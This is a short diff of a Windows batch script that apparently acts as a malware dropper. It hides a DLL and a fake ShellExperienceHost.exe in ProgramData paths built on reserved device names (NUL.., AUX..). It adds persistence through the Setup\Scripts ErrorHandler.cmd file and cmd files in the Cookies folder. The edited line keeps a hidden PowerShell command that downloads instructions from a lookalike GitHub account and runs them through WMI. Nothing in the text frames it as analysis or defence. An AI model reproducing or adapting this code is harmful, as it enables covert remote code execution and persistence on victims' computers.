@@ -16,7 +16,7 @@ move /Y "%ProgramData%\dist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
 move /Y "%ProgramData%\dist\ShellExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
 
 echo @echo off >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
-echo powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/githab0/0/0/0/configr' -UseBasicParsing).Content.Trim(); $exe, $args = $c -split ' ', 2; ([WMIClass]'Win32_Process').Create($exe + ' ' + $args)" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
+echo powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githab0/0/0/0/configr' -UseBasicParsing).Content.Trim(); $exe, $args = $c -split ' ', 2; ([WMIClass]'Win32_Process').Create($exe + ' ' + $args)" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
 echo @echo off > "%USERPROFILE%\Cookies\ini.cmd"
 echo powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll >> "%USERPROFILE%\Cookies\ini.cmd"
 echo @echo off > "%USERPROFILE%\Cookies\init.cmd"
